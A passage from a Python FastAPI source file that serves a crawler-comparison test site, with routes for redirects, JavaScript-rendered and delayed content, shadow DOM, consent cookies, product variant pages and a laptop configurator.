        <div class="variant-options">{product_color_links(color_slug, size_slug)}</div>
        <h3>Size</h3>
        <div class="variant-options">{product_size_links(color_slug, size_slug)}</div>
      </section>
    </article>
    {product_common_sections(variant)}
    <section class="product-section">
      <h2>All Separate Variant URLs</h2>
      <table class="variant-matrix">
        <thead>
          <tr><th>Variant page</th><th>SKU</th><th>Price</th><th>Stock</th></tr>
        </thead>
        <tbody>
          {product_variant_matrix()}
        </tbody>
      </table>
    </section>
    """
    return html_page(title, body, head=product_page_head())


def accepts_french(request: Request) -> bool:
    cookie_header = request.headers.get("cookie", "").lower()
    if request.cookies.get("site_language") == "fr" or "site_language=fr" in cookie_header:
        return True
    accept_language = request.headers.get("accept-language", "").lower()
    return any(part.strip().startswith("fr") for part in accept_language.split(","))


def french_about_page() -> HTMLResponse:
    head = """
    <meta http-equiv="Content-Language" content="fr" />
    <link rel="alternate" hreflang="en" href="/about" />
    <link rel="alternate" hreflang="fr" href="/fr/about" />
    <link rel="canonical" href="/about" />
    """
    body = """
    <article>
      <p>Ceci est une page rendue cote serveur avec du contenu ordinaire et deux pages enfants.</p>
      <a href="/absolute">Enfant absolu</a>
      <a href="/query-page?sort=price">Page de tri par requete</a>
    </article>
    """
    return html_page("Page A Propos", body, head=head, lang="fr")


@app.get("/_manifest")
async def manifest(request: Request):
    base = str(request.base_url).rstrip("/")
    items = []
    for entry in PAGE_MANIFEST:
        item = dict(entry)
        item["url"] = base + entry["path"]
        items.append(item)
    return JSONResponse({"pages": items, "sections": SECTION_METADATA})


@app.get("/", response_class=HTMLResponse)
async def index(request: Request):
    body = f"""
    {repeated_nav()}
    <p>Root page for crawl comparison. It mixes relative, absolute, malformed, file, status, and JS-driven links.</p>
    {homepage_sections(request)}
    <div id="local-anchor">Anchor target text</div>
    """
    return html_page("Crawl Test Home", body)


@app.get("/security/{group_slug}", response_class=HTMLResponse)
async def security_test_group(group_slug: str):
    if group_slug not in SECURITY_TEST_GROUPS:
        return PlainTextResponse("Unknown security test group", status_code=404)

    group = SECURITY_TEST_GROUPS[group_slug]
    return html_page(
        f"Security Test - {group['title']}",
        security_test_body(group_slug),
        head=security_test_head(),
    )


@app.get("/about", response_class=HTMLResponse)
async def about(request: Request):
    if accepts_french(request):
        response = french_about_page()
        if request.cookies.get("site_language") == "fr" or "site_language=fr" in request.headers.get("cookie", "").lower():
            response.delete_cookie("site_language")
        return response

    head = """
    <meta http-equiv="Content-Language" content="en" />
    <link rel="alternate" hreflang="en" href="/about" />
    <link rel="alternate" hreflang="fr" href="/fr/about" />
    <link rel="canonical" href="/about" />
    """
    body = """
    <article>
      <p>This is a server-rendered page with ordinary content and two child pages.</p>
      <a href="/absolute">Absolute child</a>
      <a href="/query-page?sort=price">Query sort page</a>
    </article>
    """
    return html_page("About Page", body, head=head, lang="en")


@app.get("/absolute", response_class=HTMLResponse)
async def absolute():
    body = """
    <p>Absolute page content that should be easy to extract.</p>
    <a href="/docs/">Docs slash version</a>
    """
    return html_page("Absolute Page", body)


@app.get("/protocol-relative-target", response_class=HTMLResponse)
async def protocol_relative_target():
    return html_page("Protocol Relative", "<p>Protocol-relative target page.</p>")


@app.get("/docs", response_class=HTMLResponse)
async def docs_no_slash():
    return html_page("Docs No Slash", '<p>Docs page without trailing slash.</p><a href="/docs/">Slash variant</a>')


@app.get("/docs/", response_class=HTMLResponse)
async def docs_with_slash():
    return html_page("Docs Slash", '<p>Docs page with trailing slash.</p><a href="/docs">Non-slash variant</a>')


@app.get("/CasePage", response_class=HTMLResponse)
async def case_upper():
    return html_page("Case Upper", "<p>Uppercase path page.</p>")


@app.get("/casepage", response_class=HTMLResponse)
async def case_lower():
    return html_page("Case Lower", "<p>Lowercase path page.</p>")


@app.get("/broken", response_class=HTMLResponse)
async def broken():
    return HTMLResponse(
        """
        <html><head><title>Broken Page</title></head>
        <body><main><div><p>Broken markup still includes content.
        <a href="/about">Nested about
        <div><a href="/client">Client page</main></body></html>
        """
    )


@app.get("/client", response_class=HTMLResponse)
async def client():
    script = """
    <script>
      const root = document.createElement("section");
      root.innerHTML = `
        <p>Client-rendered content appeared after JavaScript executed.</p>
        <a href="/delayed">Delayed page from client render</a>
        <a href="/shadow">Shadow page from client render</a>
      `;
      document.querySelector("main").appendChild(root);
    </script>
    """
    return html_page("Client Rendered", "<div id='app-root'></div>", script=script)


@app.get("/delayed", response_class=HTMLResponse)
async def delayed():
    script = """
    <script>
      setTimeout(() => {
        const section = document.createElement("section");
        section.innerHTML = '<p>Delayed content arrived later.</p><a href="/slow">Slow child link</a>';
        document.querySelector("main").appendChild(section);
      }, 1500);
    </script>
    """
    return html_page("Delayed Page", "<p>Waiting for delayed content...</p>", script=script)


@app.get("/article-related-load", response_class=HTMLResponse)
async def article_related_load():
    body = """
    <article>
      <p>The main article is available in the initial HTML before any related links are requested.</p>
      <p>This report explains how crawlers handle article pages where the recommendation rail is populated by a later server request.</p>
      <p>The body includes ordinary article copy so the page is useful even before the related-article section finishes loading.</p>
    </article>
    <section id="related-articles" aria-live="polite">
      <h2>Related Articles</h2>
      <div id="related-articles-result">Related articles load after the page load event.</div>
    </section>
    """
    script = """
    <script>
      window.addEventListener("load", async () => {
        const target = document.querySelector("#related-articles-result");
        try {
          const response = await fetch("/server-only/article-related-links");
          target.innerHTML = await response.text();
        } catch (error) {
          target.textContent = "Related articles could not load.";
        }
      });
    </script>
    """
    return html_page("Article related links after load", body, script=script)


@app.get("/server-only/article-related-links", response_class=HTMLResponse)
async def server_only_article_related_links():
    return HTMLResponse(
        """
        <ul>
          <li><a href="/query-page?from=article-related-load-1">Related article query follow-up</a></li>
          <li><a href="/about?from=article-related-load">Related article about follow-up</a></li>
        </ul>
        """
    )


@app.get("/article-related-load-empty", response_class=HTMLResponse)
async def article_related_load_empty():
    body = """
    <article>
      <p>The main article is available in the initial HTML before any related links are requested.</p>
      <p>This variant checks that a successful related-article fetch can return no article links.</p>
      <p>The page should finish with an empty related-article state instead of crawlable related links.</p>
    </article>
    <section id="related-articles-empty" aria-live="polite">
      <h2>Related Articles</h2>
      <div id="related-articles-empty-result">Related articles load after the page load event.</div>
    </section>
    """
    script = """
    <script>
      window.addEventListener("load", async () => {
        const target = document.querySelector("#related-articles-empty-result");
        try {
          const response = await fetch("/server-only/article-related-links-empty");
          target.innerHTML = await response.text();
        } catch (error) {
          target.textContent = "Related articles could not load.";
        }
      });
    </script>
    """
    return html_page("Article related links empty after load", body, script=script)


@app.get("/server-only/article-related-links-empty", response_class=HTMLResponse)
async def server_only_article_related_links_empty():
    return HTMLResponse(
        """
        <p>No related articles found.</p>
        """
    )


@app.get("/redirect-start")
async def redirect_start():
    return RedirectResponse("/redirect-middle", status_code=302)


@app.get("/redirect-middle")
async def redirect_middle():
    return RedirectResponse("/redirect-target", status_code=307)


@app.get("/redirect-target", response_class=HTMLResponse)
async def redirect_target():
    return html_page("Redirect Target", "<p>Final destination after redirect chain.</p>")


@app.get("/slow", response_class=HTMLResponse)
async def slow():
    await asyncio.sleep(2.5)
    return html_page("Slow Page", '<p>Slow page finished after a delay.</p><a href="/query-page?ref=slow">Query from slow page</a>')


@app.get("/empty", response_class=HTMLResponse)
async def empty():
    return html_page("Empty Page", "")


@app.get("/soft-error", response_class=HTMLResponse)
async def soft_error():
    return html_page("Soft Error", "<p>Sorry, the page you requested is unavailable right now.</p>")


@app.get("/iframe-host", response_class=HTMLResponse)
async def iframe_host():
    body = """
    <p>Iframe host page. Some crawlers will ignore links inside the frame.</p>
    <iframe src="/iframe-content" title="embedded"></iframe>
    """
    return html_page("Iframe Host", body)


@app.get("/iframe-content", response_class=HTMLResponse)
async def iframe_content():
    return html_page("Iframe Content", '<p>Iframe content with a link.</p><a href="/about">About from iframe</a>')


@app.get("/shadow", response_class=HTMLResponse)
async def shadow():
    script = """
    <script>
      const host = document.createElement("div");
      host.id = "shadow-host";
      document.querySelector("main").appendChild(host);
      const root = host.attachShadow({ mode: "open" });
      root.innerHTML = '<section><p>Shadow DOM content.</p><a href="/about">About in shadow</a></section>';
    </script>
    """
    return html_page("Shadow Page", "<p>Open shadow root below.</p>", script=script)


@app.get("/consent", response_class=HTMLResponse)
async def consent(request: Request):
    accepted = request.cookies.get("site_consent") == "accepted"
    if accepted:
        body = """
        <p>Consent cookie already present, so full content is visible.</p>
        <a href="/query-page?consent=1">Consent-only child page</a>
        """
    else:
        body = """
        <div id="consent-banner">
          <p>Please accept cookies to reveal the full page.</p>
          <a href="/accept-consent">Accept consent</a>
        </div>
        <p>Limited content before consent.</p>
        """
    return html_page("Consent Page", body)


@app.get("/accept-consent")
async def accept_consent():
    response = RedirectResponse("/consent", status_code=302)
    response.set_cookie("site_consent", "accepted", max_age=3600, httponly=False)
    return response


@app.get("/load-more", response_class=HTMLResponse)
async def load_more():
    head = """
    <style>
      .hidden-dom-content {
        max-height: 0;
        opacity: 0;
        overflow: hidden;
        transform: translateY(-4px);
        transition: max-height 180ms ease, opacity 180ms ease, transform 180ms ease;
      }
      .hidden-dom-content.is-open {
        max-height: 360px;
        opacity: 1;
        transform: translateY(0);
      }
    </style>
    """
    body = """
    <p>This page fetches server content only after the control opens.</p>
    <button id="load-more-toggle" type="button" aria-expanded="false" aria-controls="load-more-result">Open hidden DOM content</button>
    <div id="load-more-result"></div>
    """
    script = """
    <script>
      const loadMoreToggle = document.querySelector("#load-more-toggle");
      const loadMoreTarget = document.querySelector("#load-more-result");
      let loadMoreNode = null;

      function removeAfterTransition(element, done) {
        let finished = false;
        const finish = () => {
          if (finished) return;
          finished = true;
          element.removeEventListener("transitionend", finish);
          element.remove();
          if (done) done();
        };
        element.addEventListener("transitionend", finish);
        setTimeout(finish, 240);
      }

      async function openLoadMore() {
        if (loadMoreNode) return;
        loadMoreToggle.disabled = true;
        const response = await fetch("/server-only/load-more");
        const content = document.createElement("section");
        content.className = "hidden-dom-content";
        content.innerHTML = await response.text();
        loadMoreTarget.replaceChildren(content);
        loadMoreNode = content;
        requestAnimationFrame(() => content.classList.add("is-open"));
        loadMoreToggle.textContent = "Close hidden DOM content";
        loadMoreToggle.setAttribute("aria-expanded", "true");
        loadMoreToggle.disabled = false;
      }

      function closeLoadMore() {
        if (!loadMoreNode) return;
        const closing = loadMoreNode;
        loadMoreNode = null;
        closing.classList.remove("is-open");
        loadMoreToggle.disabled = true;
        loadMoreToggle.textContent = "Open hidden DOM content";
        loadMoreToggle.setAttribute("aria-expanded", "false");
        removeAfterTransition(closing, () => {
          loadMoreToggle.disabled = false;
        });
      }

      loadMoreToggle.addEventListener("click", () => {
        if (loadMoreNode) {
          closeLoadMore();
        } else {
          openLoadMore();
        }
      });
    </script>
    """
    return html_page("Load more page - Hidden DOM", body, head=head, script=script)


@app.get("/server-only/load-more", response_class=HTMLResponse)
async def server_only_load_more():
    return HTMLResponse(
        """
        <article>
          <p>Server-only load more content: hand-pulled chili noodles are available after the hidden-DOM fetch.</p>
          <a href="/many-links?from=server-load-more">Server load-more child link</a>
        </article>
        """
    )


@app.get("/button-redirect", response_class=HTMLResponse)
async def button_redirect():
    body = """
    <section>
      <p>This page only reveals its child destination after a JavaScript button click.</p>
      <p>No anchor tag exists for the destination before interaction.</p>
      <button id="show-next">Show Next Page</button>
    </section>
    """
    script = """
    <script>
      document.querySelector("#show-next").addEventListener("click", () => {
        const parts = ["button", "redirect", "target"];
        const builtPath = "/" + parts.join("-");
        window.location.href = builtPath + "?from=button";
      });
    </script>
    """
    return html_page("Button Redirect", body, script=script)


@app.get("/button-redirect-target", response_class=HTMLResponse)
async def button_redirect_target():
    body = """
    <section>
      <p>Target page reached only after JavaScript builds the URL and redirects.</p>
      <a href="/about?from=button-target">About child after button redirect</a>
    </section>
    """
    return html_page("Button Redirect Target", body)


@app.get("/infinite", response_class=HTMLResponse)
async def infinite():
    script = """
    <script>
      let appended = false;
      window.addEventListener("scroll", () => {
        if (appended) return;
        if (window.scrollY + window.innerHeight >= document.body.scrollHeight - 10) {
          appended = true;
          const div = document.createElement("div");
          div.innerHTML = '<p>Infinite-scroll content appended.</p><a href="/many-links?from=infinite">Infinite child</a>';
          document.querySelector("main").appendChild(div);
        }
      });
      const spacer = document.createElement("div");
      spacer.style.height = "1800px";
      document.querySelector("main").appendChild(spacer);
    </script>
    """
    return html_page("Infinite Scroll", "<p>Scroll to the bottom to reveal more links.</p>", script=script)


@app.get("/base-tag", response_class=HTMLResponse)
async def base_tag():
    head = '<base href="/docs/"><base href="/about">'
    body = """
    <p>Base tag page with a relative link that should resolve under /docs/ in browsers.</p>
    <a href="child-from-base">Child from base tag</a>
    """
    return html_page("Base Tag", body, head=head)


@app.get("/docs/child-from-base", response_class=HTMLResponse)
async def base_child():
    return html_page("Base Child", "<p>Resolved via base tag.</p>")


@app.get("/query-page", response_class=HTMLResponse)
async def query_page(request: Request):
    params = dict(request.query_params)
    content = json.dumps(params, sort_keys=True)
    return html_page("Query Page", f"<p>Query page content: {content}</p>")


@app.get("/product-pages/separate-pages", response_class=HTMLResponse)
async def product_separate_pages_default():
    return product_separate_page(PRODUCT_DEFAULT_COLOR, PRODUCT_DEFAULT_SIZE)


@app.get("/product-pages/separate-pages/{color_slug}/{size_slug}", response_class=HTMLResponse)
async def product_separate_pages_variant(color_slug: str, size_slug: str):
    if color_slug not in PRODUCT_COLORS or size_slug not in PRODUCT_SIZES:
        return PlainTextResponse("Unknown product variant", status_code=404)
    return product_separate_page(color_slug, size_slug)


def product_query_params_page(color_slug: str, size_slug: str) -> HTMLResponse:
    variant = product_variant(color_slug, size_slug)
    title = f"Product variants - Query params: {variant['color_name']} {variant['size_name']}"
    body = f"""
    <nav class="product-breadcrumbs" aria-label="Breadcrumb">
      <a href="/">Home</a>
      <span>/</span>
      <a href="/product-pages/query-params">Product Pages (Query Params)</a>
      <span>/</span>
      <span>{escape(variant['color_name'])} {escape(variant['size_name'])}</span>
    </nav>
    <article class="product-grid">
      <section class="product-visual" style="--swatch: {escape(variant['swatch'], quote=True)}">
        <strong>{escape(variant['visual_label'])}</strong>
      </section>
      <section>
        <p>{escape(PRODUCT_BRAND)}</p>
        <h2>{escape(PRODUCT_NAME)}</h2>
        <p>{escape(PRODUCT_RATING)} stars from {escape(PRODUCT_REVIEW_COUNT)} reviews</p>
        <p class="product-price">{escape(variant['price'])}</p>
        <p><strong>Selected:</strong> {escape(variant['color_name'])} / {escape(variant['size_name'])}</p>
        <p><strong>SKU:</strong> {escape(variant['sku'])}</p>
        <p><strong>Availability:</strong> {escape(variant['stock_status'])} ({variant['stock_quantity']} units)</p>
        <p><strong>Shipping:</strong> {escape(variant['shipping_message'])}</p>
        <h3>Color</h3>
        <div class="variant-options">{product_color_links_qp(color_slug, size_slug)}</div>
        <h3>Size</h3>
        <div class="variant-options">{product_size_links_qp(color_slug, size_slug)}</div>
      </section>
    </article>
    {product_common_sections(variant)}
    <section class="product-section">
      <h2>All Query Param Variant URLs</h2>
      <table class="variant-matrix">
        <thead>
          <tr><th>Variant page</th><th>SKU</th><th>Price</th><th>Stock</th></tr>
        </thead>
        <tbody>
          {product_variant_matrix_qp()}
        </tbody>
      </table>
    </section>
    """
    return html_page(title, body, head=product_page_head())


@app.get("/product-pages/query-params", response_class=HTMLResponse)
async def product_query_params_variant(color: str = PRODUCT_DEFAULT_COLOR, size: str = PRODUCT_DEFAULT_SIZE):
    if color not in PRODUCT_COLORS or size not in PRODUCT_SIZES:
        return PlainTextResponse("Unknown product variant", status_code=404)
    return product_query_params_page(color, size)


@app.get("/product-pages/javascript-calculated", response_class=HTMLResponse)
async def product_javascript_calculated():
    color_buttons = "".join(
        f'<button class="js-color-option" type="button" data-color="{escape(color_slug, quote=True)}">'
        f"{escape(color['name'])}</button>"
        for color_slug, color in PRODUCT_COLORS.items()
    )
    size_buttons = "".join(
        f'<button class="js-size-option" type="button" data-size="{escape(size_slug, quote=True)}">'
        f"{escape(size['name'])}</button>"
        for size_slug, size in PRODUCT_SIZES.items()
    )
    body = f"""
    {product_breadcrumbs("JavaScript calculated variants")}
    <article class="product-grid">
      <section id="js-product-visual" class="product-visual" style="--swatch: #e5e5e5" aria-live="polite">
        <strong>Variant visual loads after JavaScript fetches product data.</strong>
      </section>
      <section>
        <p>{escape(PRODUCT_BRAND)}</p>
        <h2>{escape(PRODUCT_NAME)}</h2>
        <p>{escape(PRODUCT_RATING)} stars from {escape(PRODUCT_REVIEW_COUNT)} reviews</p>
        <h3>Color</h3>
        <div class="variant-options" id="js-color-options">{color_buttons}</div>
        <h3>Size</h3>
        <div class="variant-options" id="js-size-options">{size_buttons}</div>
        <p class="product-price" id="js-price" aria-live="polite"></p>
        <p id="js-selected-summary" aria-live="polite">Variant details render after the product data payload loads.</p>
        <p id="js-sku"></p>
        <p id="js-stock"></p>
        <p id="js-shipping"></p>
      </section>
    </article>
    <section class="product-section">
      <h2>Details</h2>
      <p>This single-page product test updates commerce details through JavaScript without changing URLs.</p>
      <ul id="js-features"></ul>
    </section>
    <section class="product-section">
      <h2>Specifications</h2>
      <table class="product-specs">
        <tbody id="js-specs"></tbody>
      </table>
    </section>
    <section class="product-section">
      <h2>Return Policy</h2>
      <p>Unused bottles can be returned within 30 days. Open-box returns are inspected before refund approval.</p>
    </section>
    <section class="product-section">
      <h2>FAQ</h2>
      <details>
        <summary>Does changing options navigate?</summary>
        <p>No. This page keeps one URL and recalculates displayed product details in the DOM.</p>
      </details>
      <details>
        <summary>Where is the variant data?</summary>
        <p>Variant data is loaded from a same-origin JSON endpoint after JavaScript runs.</p>
      </details>
    </section>
    <section class="product-section">
      <h2>Related Accessories</h2>
      <ul>
        <li><a href="/query-page?accessory=straw-lid">Straw lid accessory</a></li>
        <li><a href="/query-page?accessory=cleaning-kit">Bottle cleaning kit</a></li>
        <li><a href="/query-page?accessory=carry-sling">Trail carry sling</a></li>
      </ul>
    </section>
    """
    script = """
    <script>
      const productDataUrl = "/product-pages/javascript-calculated/data.json";
      const colorButtons = document.querySelectorAll(".js-color-option");
      const sizeButtons = document.querySelectorAll(".js-size-option");
      let productPayload = null;
      let selectedColor = colorButtons[0].dataset.color;
      let selectedSize = sizeButtons[1].dataset.size;

      function setPressed(buttons, selectedAttribute, selectedValue) {
        buttons.forEach((button) => {
          button.setAttribute("aria-pressed", button.dataset[selectedAttribute] === selectedValue ? "true" : "false");
        });
      }

      function replaceText(selector, value) {
        document.querySelector(selector).textContent = value;
      }

      function renderList(selector, items) {
        const list = document.querySelector(selector);
        list.replaceChildren();
        items.forEach((item) => {
          const li = document.createElement("li");
          li.textContent = item;
          list.appendChild(li);
        });
      }

      function renderSpecs(variant) {
        const specs = [
          ["SKU", variant.sku],
          ["Capacity", variant.capacity],
          ["Dimensions", variant.dimensions],
          ["Weight", variant.weight],
          ["Finish", variant.finish],
          ["Stock", `${variant.stock_status} (${variant.stock_quantity} units)`],
        ];
        const tbody = document.querySelector("#js-specs");
        tbody.replaceChildren();
        specs.forEach(([label, value]) => {
          const row = document.createElement("tr");
          const th = document.createElement("th");
          const td = document.createElement("td");
          th.scope = "row";
          th.textContent = label;
          td.textContent = value;
          row.append(th, td);
          tbody.appendChild(row);
        });
      }

      function renderVariant() {
        if (!productPayload) return;
        const variant = productPayload.variants[`${selectedColor}|${selectedSize}`];
        const visual = document.querySelector("#js-product-visual");
        visual.style.setProperty("--swatch", variant.swatch);
        visual.replaceChildren();
        const visualLabel = document.createElement("strong");
        visualLabel.textContent = variant.visual_label;
        visual.appendChild(visualLabel);

        replaceText("#js-price", variant.price);
        replaceText("#js-selected-summary", `Selected: ${variant.color_name} / ${variant.size_name}`);
        replaceText("#js-sku", `SKU: ${variant.sku}`);
        replaceText("#js-stock", `Availability: ${variant.stock_status} (${variant.stock_quantity} units)`);
        replaceText("#js-shipping", `Shipping: ${variant.shipping_message}`);
        renderList("#js-features", variant.feature_bullets);
        renderSpecs(variant);
        setPressed(colorButtons, "color", selectedColor);
        setPressed(sizeButtons, "size", selectedSize);
      }

      colorButtons.forEach((button) => {
        button.addEventListener("click", () => {
          selectedColor = button.dataset.color;
          renderVariant();
        });
      });
      sizeButtons.forEach((button) => {
        button.addEventListener("click", () => {
          selectedSize = button.dataset.size;
          renderVariant();
        });
      });

      fetch(productDataUrl)
        .then((response) => response.json())
        .then((payload) => {
          productPayload = payload;
          renderVariant();
        });
    </script>
    """
    return html_page("Product variants - JavaScript calculated", body, head=product_page_head(), script=script)


@app.get("/product-pages/javascript-calculated/data.json")
async def product_javascript_calculated_data():
    return JSONResponse(product_data_payload())


@app.get("/product-pages/laptop-configurator", response_class=HTMLResponse)
async def product_laptop_configurator():
    body = f"""
    {product_breadcrumbs("Laptop configurator dependent options")}
    <article class="product-grid">
      <section id="laptop-visual" class="product-visual" style="--swatch: #d9dde3" aria-live="polite">
        <strong>Configuration preview renders after JavaScript fetches product data.</strong>
      </section>
      <section>
        <p id="laptop-brand"></p>
        <h2 id="laptop-name">Laptop configurator</h2>
        <p id="laptop-rating"></p>
        <section>
          <h3>Processor</h3>
          <div class="variant-options" data-option-group="cpu">
            <button type="button" data-category="cpu" data-option="core-8">Core 8</button>
            <button type="button" data-category="cpu" data-option="core-12">Core 12</button>
          </div>
        </section>
        <section>
          <h3>Memory</h3>
          <div class="variant-options" data-option-group="memory">
            <button type="button" data-category="memory" data-option="16gb">16GB</button>
            <button type="button" data-category="memory" data-option="32gb">32GB</button>
            <button type="button" data-category="memory" data-option="64gb">64GB</button>
          </div>
        </section>
        <section>
          <h3>Storage</h3>
          <div class="variant-options" data-option-group="storage">
            <button type="button" data-category="storage" data-option="256gb">256GB</button>
            <button type="button" data-category="storage" data-option="512gb">512GB</button>
            <button type="button" data-category="storage" data-option="1tb">1TB</button>
            <button type="button" data-category="storage" data-option="2tb">2TB</button>
          </div>
        </section>
        <section>
          <h3>Keyboard</h3>
          <div class="variant-options" data-option-group="keyboard">
            <button type="button" data-category="keyboard" data-option="us">US</button>
            <button type="button" data-category="keyboard" data-option="iso">ISO</button>
          </div>
        </section>
        <section>
          <h3>Graphics</h3>
          <div class="variant-options" data-option-group="gpu">
            <button type="button" data-category="gpu" data-option="integrated">Integrated</button>
            <button type="button" data-category="gpu" data-option="creator-gpu">Creator GPU</button>
          </div>
        </section>
        <p class="product-price" id="laptop-price" aria-live="polite"></p>
        <p id="laptop-summary" aria-live="polite">Configuration details render after the data payload loads.</p>
        <p id="laptop-sku"></p>
        <p id="laptop-availability"></p>
        <p id="laptop-shipping"></p>
        <div id="laptop-compatibility" class="configurator-notice" aria-live="polite"></div>
      </section>
    </article>
    <section class="product-section">
      <h2>Specifications</h2>
      <table class="product-specs">
        <tbody id="laptop-specs"></tbody>
      </table>
    </section>
    <section class="product-section">
      <h2>Included Modules</h2>
      <ul id="laptop-included-modules"></ul>
    </section>
    <section class="product-section">
      <h2>Upgrade Notes</h2>
      <ul id="laptop-upgrade-notes"></ul>
    </section>
    <section class="product-section">
      <h2>FAQ</h2>
      <details>
        <summary>Can dependent options change availability?</summary>
        <p>Yes. This test page disables incompatible choices after data loads and options are selected.</p>
      </details>
      <details>
        <summary>Does configuring the laptop navigate?</summary>
        <p>No. The page keeps one URL and updates the selected configuration in the DOM.</p>
      </details>
    </section>
    <section class="product-section">
      <h2>Related Accessories</h2>
      <ul id="laptop-accessories"></ul>
    </section>
    """
    script = """
    <script>
      const laptopDataUrl = "/product-pages/laptop-configurator/data.json";
      const laptopCategories = ["cpu", "memory", "storage", "keyboard", "gpu"];
      let laptopPayload = null;
      let laptopSelections = {};

      function laptopOption(category, optionId) {
        return laptopPayload.options[category].find((option) => option.id === optionId);
      }

      function setLaptopText(selector, value) {
        document.querySelector(selector).textContent = value;
      }

      function renderLaptopList(selector, items) {
        const list = document.querySelector(selector);
        list.replaceChildren();
        items.forEach((item) => {
          const li = document.createElement("li");
          if (typeof item === "string") {
            li.textContent = item;
          } else {
            const link = document.createElement("a");
            link.href = item.href;
            link.textContent = item.label;
            li.appendChild(link);
          }
          list.appendChild(li);
        });
      }

      function activeLaptopRules() {
        return laptopPayload.compatibility_rules.filter((rule) => {
          return Object.entries(rule.when).every(([category, optionId]) => {
            return laptopSelections[category] === optionId;
          });
        });
      }

      function laptopDisabledOptions() {
        const disabled = {};
        laptopCategories.forEach((category) => {
          disabled[category] = new Set();
        });
        activeLaptopRules().forEach((rule) => {
          Object.entries(rule.disable).forEach(([category, optionIds]) => {
            optionIds.forEach((optionId) => disabled[category].add(optionId));
          });
        });
        return disabled;
      }

      function applyLaptopCompatibility() {
        const disabled = laptopDisabledOptions();
        let adjusted = false;
        activeLaptopRules().forEach((rule) => {
          Object.entries(rule.fallback || {}).forEach(([category, fallbackOption]) => {
            if (disabled[category].has(laptopSelections[category])) {
              laptopSelections[category] = fallbackOption;
              adjusted = true;
            }
          });
        });
        return { disabled: laptopDisabledOptions(), adjusted };
      }

      function renderLaptopButtons(disabled) {
        document.querySelectorAll("[data-category][data-option]").forEach((button) => {
          const category = button.dataset.category;
          const optionId = button.dataset.option;
          const isDisabled = disabled[category].has(optionId);
          button.disabled = isDisabled;
          button.setAttribute("aria-disabled", isDisabled ? "true" : "false");
          button.setAttribute("aria-pressed", laptopSelections[category] === optionId ? "true" : "false");
        });
      }

      function renderLaptopSpecs(selectedOptions) {
        const rows = [
          ["Processor", selectedOptions.cpu.spec],
          ["Memory", selectedOptions.memory.spec],
          ["Storage", selectedOptions.storage.spec],
          ["Keyboard", selectedOptions.keyboard.spec],
          ["Graphics", selectedOptions.gpu.spec],
        ];
        const tbody = document.querySelector("#laptop-specs");
        tbody.replaceChildren();
        rows.forEach(([label, value]) => {
          const row = document.createElement("tr");
          const th = document.createElement("th");
          const td = document.createElement("td");
          th.scope = "row";
          th.textContent = label;
          td.textContent = value;
          row.append(th, td);
          tbody.appendChild(row);
        });
      }

      function renderLaptopConfiguration() {
        if (!laptopPayload) return;
        const compatibility = applyLaptopCompatibility();
        const selectedOptions = Object.fromEntries(
          laptopCategories.map((category) => [category, laptopOption(category, laptopSelections[category])])
        );
        const price = laptopPayload.product.base_price + laptopCategories.reduce((total, category) => {
          return total + selectedOptions[category].price_delta;
        }, 0);
        const sku = [
          laptopPayload.product.base_sku,
          selectedOptions.cpu.sku_code,
          selectedOptions.memory.sku_code,
          selectedOptions.storage.sku_code,
          selectedOptions.keyboard.sku_code,
          selectedOptions.gpu.sku_code,
        ].join("-");
        const shippingKey = selectedOptions.gpu.id === "creator-gpu"
          ? "creator"
          : (selectedOptions.memory.id === "32gb" || selectedOptions.memory.id === "64gb" ? "high_memory" : "standard");
        const activeMessages = activeLaptopRules().map((rule) => rule.message);
        const compatibilityText = compatibility.adjusted
          ? activeMessages.join(" ")
          : activeMessages.join(" ");

        setLaptopText("#laptop-brand", laptopPayload.product.brand);
        setLaptopText("#laptop-name", laptopPayload.product.name);
        setLaptopText("#laptop-rating", `${laptopPayload.product.rating} stars from ${laptopPayload.product.review_count} reviews`);
        setLaptopText("#laptop-price", `$${price}.00`);
        setLaptopText("#laptop-summary", `Selected: ${selectedOptions.cpu.label}, ${selectedOptions.memory.label}, ${selectedOptions.storage.label}, ${selectedOptions.keyboard.label}, ${selectedOptions.gpu.label}`);
        setLaptopText("#laptop-sku", `SKU: ${sku}`);
        setLaptopText("#laptop-availability", "Availability: Buildable configuration");
        setLaptopText("#laptop-shipping", `Shipping: ${laptopPayload.product.availability[shippingKey]}`);
        setLaptopText("#laptop-compatibility", compatibilityText);

        const visual = document.querySelector("#laptop-visual");
        visual.replaceChildren();
        const visualLabel = document.createElement("strong");
        visualLabel.textContent = laptopPayload.product.visual_label;
        visual.appendChild(visualLabel);

        renderLaptopSpecs(selectedOptions);
        renderLaptopList("#laptop-included-modules", laptopPayload.product.included_modules);
        renderLaptopList("#laptop-upgrade-notes", laptopPayload.product.upgrade_notes);
        renderLaptopList("#laptop-accessories", laptopPayload.product.accessories);
        renderLaptopButtons(compatibility.disabled);
      }

      document.querySelectorAll("[data-category][data-option]").forEach((button) => {
        button.addEventListener("click", () => {
          if (button.disabled) return;
          laptopSelections[button.dataset.category] = button.dataset.option;
          renderLaptopConfiguration();
        });
      });

      fetch(laptopDataUrl)
        .then((response) => response.json())
        .then((payload) => {
          laptopPayload = payload;
          laptopSelections = { ...payload.defaults };
          renderLaptopConfiguration();
        });
    </script>
    """
    return html_page("Laptop configurator - Dependent options", body, head=product_page_head(), script=script)


@app.get("/product-pages/laptop-configurator/data.json")
async def product_laptop_configurator_data():
    return JSONResponse(laptop_configurator_data_payload())


@app.get("/many-links", response_class=HTMLResponse)
async def many_links():
    body = f"""
    {repeated_nav()}
    <p>Large link set page with repeated navigation and many items.</p>
    <ul>{item_links(40)}</ul>
    """
    return html_page("Many Links", body)


@app.get("/load-test", response_class=HTMLResponse)
async def load_test():
    return html_page(LOAD_TEST_TITLE, load_test_body())


@app.get("/many/item/{item_id}", response_class=HTMLResponse)
async def many_item(item_id: int):
    next_link = f"/many/item/{item_id + 1}" if item_id < 39 else "/about"
    body = f"""
    <p>Many item page {item_id}.</p>
    <a href="{next_link}">Next item</a>
    """
    return html_page(f"Many Item {item_id}", body)


@app.get("/self-reference-direct", response_class=HTMLResponse)
async def self_reference_direct():
    body = f"""
    <p>{food_paragraph("Direct self-reference")}</p>
    <a href="/self-reference-direct">Direct link back to this same page</a>
    """
    return html_page("Direct Self Reference", body)


@app.get("/self-reference-cycle-a", response_class=HTMLResponse)
async def self_reference_cycle_a():
    body = f"""
    <p>{food_paragraph("Cycle A")}</p>
    <a href="/self-reference-cycle-b">Go to cycle page B</a>
    """
    return html_page("Self Reference Cycle A", body)


@app.get("/self-reference-cycle-b", response_class=HTMLResponse)
async def self_reference_cycle_b():
    body = f"""
    <p>{food_paragraph("Cycle B")}</p>
